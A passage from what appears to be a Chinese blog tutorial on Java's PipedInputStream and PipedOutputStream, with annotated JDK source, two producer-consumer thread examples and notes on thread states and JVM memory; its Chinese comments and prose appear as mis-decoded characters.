    protected int out = 0;
    //æé å½æ°
    public PipedInputStream(PipedOutputStream src) throws IOException {
        this(src, DEFAULT_PIPE_SIZE);//ç¼å²åºï¼byte[]æ°ç»ï¼çé¿åº¦ä½¿ç¨é»è®¤å¼1024
    }

    //æé å½æ°
    public PipedInputStream(PipedOutputStream src, int pipeSize)
            throws IOException {
         initPipe(pipeSize);//ç¼å²åºï¼byte[]æ°ç»ï¼çé¿åº¦ä½¿ç¨æå®çé¿åº¦
         //æç»è¿æ¯è°ç¨PipedOutputStreamï¼çäº§èï¼çconnect()å½æ°ï¼å¹¶æèªèº«å¯¹è±¡thisä¼ éè¿å»ï¼ç¶åå¨PipedOutputStreamï¼çäº§èï¼çconnect()å½æ°ä¸­ï¼æ¹åèªå·±ç3ä¸ªåéint in=-1ãint out=0ãboolean connected=true
         connect(src);
    }
    
    //æé å½æ°ï¼ç¼å²åºï¼byte[]æ°ç»ï¼çé¿åº¦ä½¿ç¨é»è®¤å¼1024
    public PipedInputStream() {
        initPipe(DEFAULT_PIPE_SIZE);
    }

    //æé å½æ°ï¼ç¼å²åºï¼byte[]æ°ç»ï¼çé¿åº¦ä½¿ç¨æå®çé¿åº¦
    public PipedInputStream(int pipeSize) {
        initPipe(pipeSize);
    }
    
    //åå§åç¼å²åºï¼byte[]æ°ç»ï¼
    private void initPipe(int pipeSize) {
         if (pipeSize &lt;= 0) {
            throw new IllegalArgumentException("Pipe Size &lt;= 0");
         }
         buffer = new byte[pipeSize];
    }

    public void connect(PipedOutputStream src) throws IOException {
        src.connect(this); //æç»è¿æ¯è°ç¨PipedOutputStreamï¼çäº§èï¼çconnect()å½æ°ï¼å¹¶æèªèº«å¯¹è±¡thisä¼ éè¿å»ï¼ç¶åå¨PipedOutputStreamï¼çäº§èï¼çconnect()å½æ°ä¸­ï¼æ¹åèªå·±ç3ä¸ªåéint in=-1ãint out=0ãboolean connected=true
    }
    
    //çº¿ç¨åæ­¥å½æ°ï¼è¯¥å½æ°åªè¢«PipedOutputStreamï¼çäº§èï¼çwrite(int b)å½æ°è°ç¨
    protected synchronized void receive(int b) throws IOException {
        checkStateForReceive();//æ£æ¥PipedInputStream ï¼æ¶è´¹èï¼çç¶æ
        writeSide = Thread.currentThread();//å½åæ§è¡è¯¥å½æ°ççº¿ç¨ï¼å°±æ¯çäº§èçº¿ç¨
        if (in == out)
            //å¦æç¼å²åºï¼byte[]æ°ç»ï¼çè¯»æé==ç¼å²åºï¼byte[]æ°ç»ï¼çåæéï¼å¤éæææ¶è´¹èçº¿ç¨ï¼èªå·±è¿ä¸ªçäº§èçº¿ç¨è°ç¨wait(1000)å½æ°
            awaitSpace();
        if (in &lt; 0) {//ç¼å²åºï¼byte[]æ°ç»ï¼çåæé&lt;0æ¶ï¼è®¾ç½®ç¼å²åºï¼byte[]æ°ç»ï¼çåæé=0ï¼ç¼å²åºï¼byte[]æ°ç»ï¼çè¯»æé=0
            in = 0;
            out = 0;
        }
        buffer[in++] = (byte)(b &amp; 0xFF);//åç¼å²åºçåæéä½ç½®åå¥1ä¸ªå­è
        if (in &gt;= buffer.length) {
            in = 0;//å¦æç¼å²åºæ»¡äºï¼è®¾ç½®ç¼å²åºçåæé=0
        }
    }

    //çº¿ç¨åæ­¥å½æ°ï¼è¯¥å½æ°åªè¢«PipedOutputStreamï¼çäº§èï¼çwrite(byte b[], int off, int len)å½æ°è°ç¨
    synchronized void receive(byte b[], int off, int len)  throws IOException {
        checkStateForReceive();//æ£æ¥PipedInputStream ï¼æ¶è´¹èï¼çç¶æ
        writeSide = Thread.currentThread();//å½åæ§è¡è¯¥å½æ°ççº¿ç¨ï¼å°±æ¯çäº§èçº¿ç¨
        int bytesToTransfer = len;//çäº§èçº¿ç¨è¦åå¥å°ç¼å²åºï¼byte[]æ°ç»ï¼ä¸­çå­èæ»é
        while (bytesToTransfer &gt; 0) {
            if (in == out)
                //å¦æç¼å²åºï¼byte[]æ°ç»ï¼çè¯»æé==ç¼å²åºï¼byte[]æ°ç»ï¼çåæéï¼å¤éæææ¶è´¹èçº¿ç¨ï¼èªå·±è¿ä¸ªçäº§èçº¿ç¨è°ç¨wait(1000)å½æ°
                awaitSpace();
            int nextTransferAmount = 0;//æ¬æ¬¡çäº§èçº¿ç¨è¦åå¥å°ç¼å²åºï¼byte[]æ°ç»ï¼ä¸­çå­èæ°é
            if (out &lt; in) {
                //å¦æç¼å²åºçè¯»æé&lt;ç¼å²åºçåæéï¼æ¬æ¬¡è¦åå¥å°ç¼å²åºï¼byte[]æ°ç»ï¼ä¸­çå­èæ°é=ç¼å²åºçé¿åº¦-ç¼å²åºçåæé
                nextTransferAmount = buffer.length - in;
            } else if (in &lt; out) {
                if (in == -1) {
                    in = out = 0;
                    //å¦æç¼å²åºçè¯»æéï¼outï¼&gt; ç¼å²åºçåæéï¼inï¼å¹¶ä¸ç¼å²åºçåæéï¼inï¼=-1ï¼åè®¾ç½®ç¼å²åºçè¯»ï¼outï¼ãåï¼inï¼æé=0ï¼æ¬æ¬¡è¦åå¥å°ç¼å²åºï¼byte[]æ°ç»ï¼ä¸­çå­èæ°é=ç¼å²åºçé¿åº¦
                    nextTransferAmount = buffer.length - in;
                } else {
                    //å¦æç¼å²åºçè¯»æéï¼outï¼&gt; ç¼å²åºçåæéï¼inï¼å¹¶ä¸ç¼å²åºçåæéï¼inï¼=-1ï¼æ¬æ¬¡è¦åå¥å°ç¼å²åºï¼byte[]æ°ç»ï¼ä¸­çå­èæ°é=è¯»æéï¼outï¼-åæéï¼inï¼
                    nextTransferAmount = out - in;
                }
            }
            //æ¬æ¬¡çäº§èçº¿ç¨è¦åå¥å°ç¼å²åºï¼byte[]æ°ç»ï¼ä¸­çå­èæ°éæå¤ä¸ºlenï¼ä¸æ¬¡ä¸ºlen-æ¬æ¬¡åå¥å°ç¼å²åºï¼byte[]æ°ç»ï¼ä¸­çå­èæ°éï¼ä¹å°±æ¯æ¯æ¬¡åå¥çåºäºlenä¸ªå­èå¾ªç¯éåä¸ä¸æ¬¡åå¥ç
            if (nextTransferAmount &gt; bytesToTransfer)
                nextTransferAmount = bytesToTransfer;
            assert(nextTransferAmount &gt; 0);
            System.arraycopy(b, off, buffer, in, nextTransferAmount);//åç¼å²åºï¼byte[]æ°ç»ï¼ç[in,in+nextTransferAmount)ç´¢å¼ä½ç½®åå¥byte[]æ°ç»bä¸­[off,off+nextTransferAmount)ç´¢å¼ä½ç½®çå­èï¼é½æ¯å·¦é­å³å¼ã
            bytesToTransfer -= nextTransferAmount;//æ¯ä¸æ¬¡é½åºäºlenä¸ªå­èå¾ªç¯éåæ¬æ¬¡åå¥å°ç¼å²åºï¼byte[]æ°ç»ï¼ä¸­çå­èæ°énextTransferAmount
            off += nextTransferAmount;//å°ä¸æ¬¡è¦ä»byte[]æ°ç»bä¸­åå­èçèµ·å§ç´¢å¼çä½ç½®ï¼åç§»éï¼+æ¬æ¬¡åå¥å°ç¼å²åºï¼byte[]æ°ç»ï¼ä¸­çå­èæ°énextTransferAmount
            in += nextTransferAmount;//å°ç¼å²åºçåæéï¼inï¼+æ¬æ¬¡åå¥å°ç¼å²åºï¼byte[]æ°ç»ï¼ä¸­çå­èæ°énextTransferAmount
            if (in &gt;= buffer.length) {
                in = 0;//å¦æç¼å²åºçåæéï¼inï¼&gt; ç¼å²åºï¼byte[]æ°ç»ï¼çé¿åº¦ï¼è®¾ç½®ç¼å²åºçåæéï¼inï¼=0
            }
        }
    }

    //æ£æ¥PipedInputStream ï¼æ¶è´¹èï¼çç¶æ
    private void checkStateForReceive() throws IOException {
        if (!connected) {
            throw new IOException("Pipe not connected");
        } else if (closedByWriter || closedByReader) {
            throw new IOException("Pipe closed");
        } else if (readSide != null &amp;&amp; !readSide.isAlive()) {
            throw new IOException("Read end dead");
        }
    }
    
    //å¦æç¼å²åºï¼byte[]æ°ç»ï¼çè¯»æé==ç¼å²åºï¼byte[]æ°ç»ï¼çåæéï¼å¤éæææ¶è´¹èçº¿ç¨ï¼èªå·±è¿ä¸ªçäº§èçº¿ç¨è°ç¨wait(1000)å½æ°
    private void awaitSpace() throws IOException {
        while (in == out) {
            checkStateForReceive();

            /* full: kick any waiting readers */
            notifyAll();
            try {
                wait(1000);
            } catch (InterruptedException ex) {
                throw new java.io.InterruptedIOException();
            }
        }
    }
    //å³é­ä¸è¿ä¸ª PipedInputStream ï¼æ¶è´¹èï¼ç¸å³èçPipedOutputStreamï¼çäº§èï¼
    synchronized void receivedLast() {
        closedByWriter = true;
        notifyAll();//å¤éæææ¶è´¹èçº¿ç¨
    }
    //çº¿ç¨åæ­¥å½æ°ï¼æ¶è´¹èçº¿ç¨æ¯æ¬¡ä»ç¼å²åºï¼byte[]æ°ç»ï¼ä¸­è¯»å1ä¸ªå­è
    public synchronized int read()  throws IOException {
        if (!connected) {//æ£æ¥æ è®°ç¬¦connectedï¼å¦æä¸ºfalseï¼æåºIOException
            throw new IOException("Pipe not connected");
        } else if (closedByReader) {//æ£æ¥æ è®°ç¬¦closedByReaderï¼å¦æä¸ºtrueï¼æåºIOException
            throw new IOException("Pipe closed");
        } else if (writeSide != null &amp;&amp; !writeSide.isAlive()
                   &amp;&amp; !closedByWriter &amp;&amp; (in &lt; 0)) {
           //æ£æ¥å½åè¿ä¸ªPipedInputStream ï¼æ¶è´¹èï¼å¯¹è±¡ä¸­å¼ç¨ççäº§èçº¿ç¨åçäº§èçº¿ç¨çç¶æï¼å¦æåæ è®°ç¬¦closedByWriterè¿æç¼å²åºï¼byte[]æ°ç»ï¼çåæéï¼inï¼ä¸è½å¯¹åºçè¯ï¼æåºä¸ä¸ªIOException
            throw new IOException("Write end dead");
        }

        readSide = Thread.currentThread();//å½åæ§è¡è¯¥å½æ°ççº¿ç¨ï¼å°±æ¯æ¶è´¹èçº¿ç¨
        int trials = 2;//è¿æ¯ä¸ä¸ªå¤æ¬¡æ£æµçç­ç¥åéï¼é²æ­¢çäº§èçº¿ç¨æ²¡æå³é­äºä¸è¿ä¸ª PipedInputStream ï¼æ¶è´¹èï¼ç¸å³èçPipedOutputStreamï¼çäº§èï¼æ¶ä¾¿æåºIOException
        //in=-1çæåµæç§ï¼
        //â ãçäº§èçº¿ç¨è¿æ²¡æåç¼å²åºï¼byte[]æ°ç»ï¼ä¸­åä»»ä½å­è
        //â¡ãæ¶è´¹èçº¿ç¨ä»ç¼å²åºï¼byte[]æ°ç»ï¼ä¸­è¯»å®å­èï¼byteï¼æ°æ®ä»¥åè¯»æéï¼outï¼=åæéï¼inï¼ï¼é£ä¹ï¼å½åæ¶è´¹èçº¿ç¨ä¼è®¾ç½®åæéï¼inï¼=-1
        //â¢ãæ¶è´¹èçº¿ç¨æ§è¡PipedInputStream çclose()å½æ°åï¼å³é­äºè¿ä¸ª PipedInputStream ï¼æ¶è´¹èï¼
        while (in &lt; 0) {
            if (closedByWriter) {
                /* closed by writer, return EOF */
                return -1;
            }
            if ((writeSide != null) &amp;&amp; (!writeSide.isAlive()) &amp;&amp; (--trials &lt; 0)) {
                //å¤ä¸ªæ¶è´¹èçº¿ç¨ä»ç¼å²åºï¼byte[]æ°ç»ï¼ä¸­è¯»çæ¶åï¼å¹¶ä¸åä¸ä¸ªæ¶è´¹èçº¿ç¨å·²ç»æç¼å²åºï¼byte[]æ°ç»ï¼ä¸­åå¥çå­èè¯»å®äºï¼å¹¶ä¸åä¸ä¸ªçº¿ç¨è®¾ç½®äºåæéï¼inï¼=-1ï¼çäº§èçº¿ç¨ä¹å³é­äºä¸è¿ä¸ª PipedInputStream ï¼æ¶è´¹èï¼ç¸å³èçPipedOutputStreamï¼çäº§èï¼æ¶ï¼æåºä¸ä¸ªIOException
                throw new IOException("Pipe broken");
            }
            /* might be a writer waiting */
            notifyAll();//æ­¤å¤çç®çæ¯ä¸ºäºå¤éææçäº§èçº¿ç¨
            try {
                wait(1000);
            } catch (InterruptedException ex) {
                throw new java.io.InterruptedIOException();
            }
        }
        int ret = buffer[out++] &amp; 0xFF;//è·åç¼å²åºï¼byte[]æ°ç»ï¼ä¸­è¯»æéï¼outï¼ç´¢å¼ä½ç½®çå­è,å¹¶ä¸å°è¯»æéï¼outï¼+1
        if (out &gt;= buffer.length) {
            out = 0;//å¦æè¯»æéï¼outï¼&gt;=ç¼å²åºï¼byte[]æ°ç»ï¼çé¿åº¦ï¼è®¾ç½®è¯»æéï¼outï¼=0
        }
        if (in == out) {
            /* now empty */
            in = -1;//å¦ææ¶è´¹èçº¿ç¨ä»ç¼å²åºï¼byte[]æ°ç»ï¼ä¸­è¯»å®å­èï¼byteï¼æ°æ®ä»¥åè¯»æéï¼outï¼=åæéï¼inï¼ï¼é£ä¹ï¼å½åæ¶è´¹èçº¿ç¨ä¼è®¾ç½®åæéï¼inï¼=-1
        }

        return ret;
    }

    //çº¿ç¨åæ­¥å½æ°ï¼å¦æç¼å²åºï¼byte[]æ°ç»ï¼ä¸­æè¶³å¤å¤çå­èçè¯ï¼æ°é&gt;lenï¼ï¼æ¶è´¹èçº¿ç¨æ¯æ¬¡ä»ç¼å²åºï¼byte[]æ°ç»ï¼ä¸­è¯»ålenä¸ªå­èæ¾å°byte[]æ°ç»bç[off, off+len)ç´¢å¼ä½ç½®ï¼å·¦é­å³å¼ï¼ä¸åæ¬off+lenï¼
    //å¦æç¼å²åºï¼byte[]æ°ç»ï¼ä¸­å­èçæ°é&lt;lenä¸ªï¼æ¯å¦æinï¼åæéï¼-outï¼è¯»æéï¼ä¸ªï¼ï¼æ¶è´¹èçº¿ç¨æ¯æ¬¡ä»ç¼å²åºï¼byte[]æ°ç»ï¼ä¸­è¯»åï¼in-outï¼ä¸ªå­èæ¾å°byte[]æ°ç»bç[off, off+in-out)ç´¢å¼ä½ç½®ï¼å·¦é­å³å¼ï¼ä¸åæ¬off+in-outï¼
    public synchronized int read(byte b[], int off, int len)  throws IOException {
        if (b == null) {
            throw new NullPointerException();
        } else if (off &lt; 0 || len &lt; 0 || len &gt; b.length - off) {//byte[]æ°ç»bç[off,off+len)ï¼å·¦é­å³å¼ï¼ç´¢å¼ä½ç½®æ¯å¦æè¶ççæ£æ¥
            throw new IndexOutOfBoundsException();//è¶ççè¯ï¼æåºä¸ä¸ªIndexOutOfBoundsException
        } else if (len == 0) {
            return 0;//å¦ælen==0ï¼è¿å0
        }

        /* possibly wait on the first character */
        int c = read();//åè°ç¨read()å½æ°è¯æ¢æ§ä»ç¼å²åºï¼byte[]æ°ç»ï¼ä¸­è¯»1ä¸ªå­è
        if (c &lt; 0) {
            return -1;//å¦æè¯æ¢æ§çä»ç¼å²åºï¼byte[]æ°ç»ï¼ä¸­é½è¯»ä¸å°1ä¸ªå­èï¼è¿å-1
        }
        b[off] = (byte) c;//æè¯æ¢æ§ä»ç¼å²åºï¼byte[]æ°ç»ï¼ä¸­è¯»å°çç¬¬1ä¸ªå­èæ¾å°byte[]æ°ç»bçoffç´¢å¼ä½ç½®
        int rlen = 1;//ç´¯è®¡ä»ç¼å²åºï¼byte[]æ°ç»ï¼ä¸­è¯»å°çææå­èæ°é
        while ((in &gt;= 0) &amp;&amp; (len &gt; 1)) {

            int available;//æ¬æ¬¡æ§è¡System.arraycopy()å½æ°å¯ä»¥ä»ç¼å²åºï¼byte[]æ°ç»ï¼ä¸­è¯»å°byte[]æ°ç»bä¸­çå­èæ°é

            if (in &gt; out) {
                available = Math.min((buffer.length - out), (in - out));
            } else {
                available = buffer.length - out;
            }

            // A byte is read beforehand outside the loop
            if (available &gt; (len - 1)) {//åæè¯æ¢æ§ä»ç¼å²åºï¼byte[]æ°ç»ï¼ä¸­è¯»å°çç¬¬1ä¸ªå­è
                available = len - 1;
            }
            System.arraycopy(buffer, out, b, off + rlen, available);
            out += available;//è¯»æéï¼outï¼+System.arraycopy()å½æ°ä»ç¼å²åºï¼byte[]æ°ç»ï¼ä¸­è¯»å°byte[]æ°ç»bä¸­çå­èæ°é
            rlen += available;//ç´¯è®¡ä»ç¼å²åºï¼byte[]æ°ç»ï¼ä¸­è¯»å°çææå­èæ°é + System.arraycopy()å½æ°ä»ç¼å²åºï¼byte[]æ°ç»ï¼ä¸­è¯»å°byte[]æ°ç»bä¸­çå­èæ°é
            len -= available;//len - System.arraycopy()å½æ°ä»ç¼å²åºï¼byte[]æ°ç»ï¼ä¸­è¯»å°byte[]æ°ç»bä¸­çå­èæ°é

            if (out &gt;= buffer.length) {
                out = 0;//å¦æè¯»æéï¼outï¼&gt;=ç¼å²åºï¼byte[]æ°ç»ï¼çé¿åº¦ï¼è®¾ç½®è¯»æéï¼outï¼=0
            }
            if (in == out) {
                /* now empty */
                in = -1;//å¦ææ¶è´¹èçº¿ç¨ä»ç¼å²åºï¼byte[]æ°ç»ï¼ä¸­è¯»å®å­èï¼byteï¼æ°æ®ä»¥åè¯»æéï¼outï¼=åæéï¼inï¼ï¼é£ä¹ï¼å½åæ¶è´¹èçº¿ç¨ä¼è®¾ç½®åæéï¼inï¼=-1
            }
        }
        return rlen;//è¿åç´¯è®¡ä»ç¼å²åºï¼byte[]æ°ç»ï¼ä¸­è¯»å°çææå­èæ°é
    }
    
    //çº¿ç¨åæ­¥å½æ°ï¼è¿åç¼å²åºï¼byte[]æ°ç»ï¼ä¸­å¯ä»¥è¢«æ¶è´¹èçº¿ç¨è¯»åçå­èæ°é
    public synchronized int available() throws IOException {
        if(in &lt; 0)
            return 0;
        else if(in == out)
            return buffer.length;
        else if (in &gt; out)
            return in - out;
        else
            return in + buffer.length - out;
    }
    
    //å³é­è¿ä¸ª PipedInputStream ï¼æ¶è´¹èï¼ï¼å¶å®å°±æ¯è®¾ç½®æ è®°ç¬¦closedByReader=trueï¼ è®¾ç½®åæéï¼inï¼=-1
    public void close()  throws IOException {
        closedByReader = true;
        synchronized (this) {
            in = -1;
        }
    }
}
</code></pre>
<h4 id="ä¸1ä¸ªçº¿ç¨åpipedoutputstreamçäº§èåå­èæ°æ®1ä¸ªçº¿ç¨ä»pipedinputstreamæ¶è´¹èè¯»åå­èæ°æ®çè¿ç¨">ä¸ã1ä¸ªçº¿ç¨åPipedOutputStreamï¼çäº§èï¼åå­èæ°æ®ï¼1ä¸ªçº¿ç¨ä»PipedInputStreamï¼æ¶è´¹èï¼è¯»åå­èæ°æ®çè¿ç¨</h4>
<h5 id="31éå¾ªç¯ç´æ¥ååéå¾ªç¯ç´æ¥è¯»">3.1ãéå¾ªç¯ç´æ¥ååéå¾ªç¯ç´æ¥è¯»</h5>
<pre><code>package com.chelong.StreamAndReader;

import java.io.IOException;
import java.io.PipedInputStream;
import java.io.PipedOutputStream;

public class PipedTest {
   public static void main(String[] args) throws IOException {
      final PipedOutputStream output = new PipedOutputStream();
      final PipedInputStream input = new PipedInputStream(output);
      Thread thread1 = new Thread(new Runnable() {
         @Override
         public void run() {
            try {
               output.write("Hello world, pipe!".getBytes());//write()å½æ°æ¯é»å¡ç
            } catch (IOException e) {
            }
         }
      });

      Thread thread2 = new Thread(new Runnable() {
         @Override
         public void run() {
            try {
               int data = -1;
               while ((data = input.read()) != -1) {//read()å½æ°æ¯é»å¡ç
                  System.out.print((char) data);
               }
            } catch (IOException e) {
            }
         }
      });

      thread1.start();
      thread2.start();
   }
}
</code></pre>
<p>ç¨åºè¿è¡ç»æï¼å¦ä¸æç¤ºï¼<br>
<img alt="clipboard" loading="lazy" data-src="https://img2024.cnblogs.com/blog/2485827/202602/2485827-20260219212445827-714738061.png" class="lazyload"></p>
<p>ââmainçº¿ç¨æé PipedOutputStreamï¼çäº§èï¼åPipedInputStreamï¼æ¶è´¹èï¼çè¿ç¨å¦ä¸ï¼<br>
<img alt="clipboard" loading="lazy" data-src="https://img2024.cnblogs.com/blog/2485827/202602/2485827-20260219212510743-1554062823.png" class="lazyload"></p>
<p>ââåPipedOutputStreamï¼çäº§èï¼åå­èæ°æ®ççäº§èçº¿ç¨çæ§è¡è¿ç¨å¦ä¸ï¼</p>
<p><img alt="clipboard" loading="lazy" data-src="https://img2024.cnblogs.com/blog/2485827/202602/2485827-20260219212544914-451659960.png" class="lazyload"><br>
<img alt="clipboard" loading="lazy" data-src="https://img2024.cnblogs.com/blog/2485827/202602/2485827-20260219212555287-1090346414.png" class="lazyload"></p>
<p>ââä»PipedInputStreamï¼æ¶è´¹èï¼è¯»åå­èæ°æ®çæ¶è´¹èçº¿ç¨çæ§è¡è¿ç¨å¦ä¸ï¼<br>
<img alt="clipboard" loading="lazy" data-src="https://img2024.cnblogs.com/blog/2485827/202602/2485827-20260219212607497-1898462647.png" class="lazyload"></p>
<h6 id="311éå¾ªç¯ç´æ¥ååéå¾ªç¯ç´æ¥è¯»æ¶1ä¸ªçäº§èçº¿ç¨å1ä¸ªæ¶è´¹èçº¿ç¨å¤çæ°æ®çè¿ç¨">3.1.1ãéå¾ªç¯ç´æ¥ååéå¾ªç¯ç´æ¥è¯»æ¶1ä¸ªçäº§èçº¿ç¨å1ä¸ªæ¶è´¹èçº¿ç¨å¤çæ°æ®çè¿ç¨</h6>
<p>ââJava è¯­è¨å®ä¹äº 6 ç§çº¿ç¨ç¶æ, å¨ä»»æä¸ä¸ªæ¶é´ç¹, ä¸ä¸ªçº¿ç¨åªè½æä¸åªæå¶ä¸­çä¸ç§ç¶æ, è¿ 6 ç§ç¶æåå«å¦ä¸ï¼<br>
<img alt="clipboard" loading="lazy" data-src="https://img2024.cnblogs.com/blog/2485827/202602/2485827-20260219212638111-71943307.png" class="lazyload"></p>
<p>è¿ 6 ç§çº¿ç¨ç¶æçç®åä»ç»ï¼å¦ä¸æç¤º<br>
<img alt="clipboard" loading="lazy" data-src="https://img2024.cnblogs.com/blog/2485827/202602/2485827-20260219212705389-2145559667.png" class="lazyload"></p>
<p>ââJVMè¿è¡æ¶åå­ç»æä¸»è¦åå«äºäºä¸ªé¨åï¼ç¨åºè®¡æ°å¨ ï¼PCå¯å­å¨ï¼ã JVMæ ãNativeæ¹æ³æ ãå ã æ¹æ³åºãå¦ä¸å¾æç¤ºï¼<br>
<img alt="clipboard" loading="lazy" data-src="https://img2024.cnblogs.com/blog/2485827/202602/2485827-20260219212726158-604379458.png" class="lazyload"></p>
<p>å¾ä¸­çº¢è²é¨åæ¯çº¿ç¨ç§æåºåï¼è¿å¥è¿ä¸ªåºåçæ°æ®ä¸ä¼åºç°çº¿ç¨ç«äºçå³ç³»ãèç»¿è²åºåä¸­çæ°æ®åè¢«ææçº¿ç¨å±äº«ï¼å¶ä¸­Javaå ä¸­å­æ¾çæ¯å¤§éå¯¹è±¡ï¼æ¹æ³åºä¸­å­æ¾classä¿¡æ¯ãå¸¸éãéæåéç­æ°æ®ã<br>
ââæ¯ä¸ªçº¿ç¨ççº¿ç¨æ ä¸­ä¼å­æ¾å½æ°ï¼æ¹æ³ï¼çæè¿°ç¬¦ï¼æåï¼æ¬å°ï¼åéç­ï¼å½æ°ï¼æ¹æ³ï¼å¨çº¿ç¨æ ä¸­ä¼éè¿åæ åå¼¹æ æ¥æ§è¡ï¼é¤äº8ç§ï¼byteãshortãintãlongãfloatãdoubleãbooleanãcharï¼åºæ¬çæ°æ®ç±»åå­å¨å¨çº¿ç¨æ ä¸­ä»¥å¤ï¼å¶ä½çå¼ç¨æ°æ®ç±»åï¼å¯¹è±¡ï¼é½å­å¨å¨å ä¸­ï¼ç¶åéè¿å¼ç¨å°å ä¸­çå¯¹è±¡åçº¿ç¨æ ä¸­çåéå³èèµ·æ¥ï¼ä¹å¯ä»¥å«çº¿ç¨æ ä¸­çå¼ç¨æåå ä¸­çå¯¹è±¡ï¼ã<br>
<img alt="clipboard" loading="lazy" data-src="https://img2024.cnblogs.com/blog/2485827/202602/2485827-20260219212846610-2137279183.png" class="lazyload"></p>
<p>é£ä¹ï¼å½ä½¿ç¨èæ§è¡3.1ä¸­çä»£ç æ¶ï¼1ä¸ªçäº§èçº¿ç¨å1ä¸ªæ¶è´¹èçº¿ç¨å¤çæ°æ®çè¿ç¨å¦ä¸ï¼<br>
â ãmainçº¿ç¨åå§åä¸ä¸ªç¼å²åºï¼byte[]æ°ç»ï¼ï¼é¿åº¦ä¸º1024ï¼é»è®¤å¼ï¼ï¼ç¶åçäº§èçº¿ç¨éè¿ä¸æ­çåæ æ¥å®æå½æ°ä¹é´çè°ç¨ï¼æç»æ§è¡PipedInputStream.class::receive(byte b[], int off, int len)å½æ°æ¥å¯¹ç¼å²åºï¼byte[]æ°ç»ï¼è¿è¡å¡«åï¼å¦ä¸æç¤ºï¼<br>
<img alt="clipboard" loading="lazy" data-src="https://img2024.cnblogs.com/blog/2485827/202602/2485827-20260219212906698-848464368.png" class="lazyload"></p>
<p>â¡ãå½çäº§èçº¿ç¨å¡«åå®ç¼å²åºä¹åï¼åæéåéint in=17ï¼è¯»æéåéint out=0ï¼Thread writeSide = å½åè¿ä¸ªçäº§èçº¿ç¨ï¼Threadï¼å¯¹è±¡ï¼çäº§èçº¿ç¨ä¼æèªå·±çº¿ç¨æ ä¸­ä¿®æ¹çåéæç»å·æ°å°å ä¸­PipedInputStreamå¯¹è±¡ä¸­ï¼ä»¥ç¡®ä¿å¶å®æ¶è´¹èçº¿ç¨ççº¿ç¨æ ä»å ä¸­è¯»åè¿3ä¸ªåéæ¶ï¼è¿3ä¸ªåéå·²ç»ä¸ºä¿®æ¹åçå¼ï¼å¦ä¸æç¤ºï¼<br>
<img alt="clipboard" loading="lazy" data-src="https://img2024.cnblogs.com/blog/2485827/202602/2485827-20260219212918513-1084660758.png" class="lazyload"></p>
<p>â¢ãæ¶è´¹èçº¿ç¨è¯»ç¼å²åºï¼byte[]æ°ç»ï¼çè¿ç¨ä¸­ä¼ä¸æ­å°æ§è¡out++ï¼è¯»æéï¼ä»¥è¯»åç¼å²åºï¼byte[]æ°ç»ï¼ä¸­çå¯ç¨å­èå¹¶è¿åï¼ç´å°outï¼è¯»æéï¼==inï¼åæéï¼ï¼ä¿®æ¹inï¼åæéï¼=-1ï¼å¹¶ä¸æ¯æ¬¡åæ­¥æ§è¡PipedInputStream.class::read()å½æ°æ¶ï¼é½ä¼æ´æ°Thread readSide = å½åè¿ä¸ªæ¶è´¹èçº¿ç¨ï¼Threadï¼å¯¹è±¡ï¼æ¶è´¹èçº¿ç¨ä¹ä¼æèªå·±çº¿ç¨æ ä¸­ä¿®æ¹çåéæç»å·æ°å°å ä¸­PipedInputStreamå¯¹è±¡ä¸­ï¼ä»¥ç¡®ä¿å¶å®æ¶è´¹èçº¿ç¨ççº¿ç¨æ ä»å ä¸­è¯»åè¿3ä¸ªåéæ¶ï¼è¿3ä¸ªåéå·²ç»ä¸ºä¿®æ¹åçå¼ï¼å¦ä¸æç¤ºï¼<br>
<img alt="clipboard" loading="lazy" data-src="https://img2024.cnblogs.com/blog/2485827/202602/2485827-20260219212929105-1277795762.png" class="lazyload"></p>
<p>â£ãæ´æ°inï¼åæéï¼=-1åï¼æ¶è´¹èçº¿ç¨åæ¬¡åæ­¥æ§è¡PipedInputStream.class::read()å½æ°æ¶ï¼å¦æPipedInputStream::boolean closedByWriteråéä¸ºtrueï¼åä¼è¿å-1</p>
<h5 id="32å éå¾ªç¯ååéå éå¾ªç¯è¯»å°byteæ°ç»bä¸­åå¤ç">3.2ãå éå¾ªç¯ååéå éå¾ªç¯è¯»å°byte[]æ°ç»bä¸­åå¤ç</h5>
<pre><code>package com.chelong.pipe;
import java.io.IOException;
import java.io.PipedInputStream;
import java.io.PipedOutputStream;

public class PipeForTransferInThread {
   public static void main(String[] args) throws IOException, InterruptedException {
      final PipedOutputStream output = new PipedOutputStream();
      final PipedInputStream input = new PipedInputStream(output);
      //çäº§èçº¿ç¨
      Thread producer = new Thread(new Runnable() {
         @Override
         public void run() {
            for (int i = 0; i &lt; 3; i++) {
               synchronized (input) {
                  try {
//                    input.wait();
                     output.write("Hello world, pipe!".getBytes());
                     input.wait();//éæ¾éå¹¶æ éç­å¾ï¼ç´å°æ¶è´¹èçº¿ç¨consumer æ§è¡notifyAll()å½æ°æ¥å¤éå½åé»å¡
                  } catch (Exception e) {
                     e.printStackTrace();
                  }
               }
            }
         }
      },"çäº§èçº¿ç¨");
      
      //æ¶è´¹èçº¿ç¨
      Thread consumer = new Thread(new Runnable() {
         @Override
         public void run() {
            try {
               byte[] b = new byte[1024];//1KB
               int readBytes = -1;
               long lastTime = System.currentTimeMillis();
               while ((readBytes = input.read(b, 0, b.length)) != -1) {
                  long curTime = System.currentTimeMillis();
                  System.out.print(Thread.currentThread().getName()+"æ¬æ¬¡è¯»åè±è´¹æ¶é´ï¼" + (curTime - lastTime) + "msï¼è¯»å°çæ°æ®æ¯ï¼");
                  lastTime = curTime;
                  for (int i = 0; i &lt; readBytes; i++) {
                     System.out.print((char) b[i]);//æ¨¡æå¤çå­èæ°æ®
                  }
                  System.out.println();
               }
            } catch (IOException e) {
               e.printStackTrace();
            }
         }
      },"æ¶è´¹èçº¿ç¨");
      producer.start();//çäº§èçº¿ç¨å¯å¨
      consumer.start();//æ¶è´¹èçº¿ç¨å¯å¨
   }
}
</code></pre>
<p>ç¨åºè¿è¡ç»æï¼å¦ä¸æç¤ºï¼<br>
<img alt="clipboard" loading="lazy" data-src="https://img2024.cnblogs.com/blog/2485827/202602/2485827-20260219212957175-20935426.png" class="lazyload"></p>
<p>ââmainçº¿ç¨æé PipedOutputStreamï¼çäº§èï¼åPipedInputStreamï¼æ¶è´¹èï¼çè¿ç¨å¯ä»¥åè3.1ï¼<br>
ââåPipedOutputStreamï¼çäº§èï¼åå­èæ°æ®ççäº§èçº¿ç¨çæ§è¡è¿ç¨å¯ä»¥åè3.1ï¼<br>
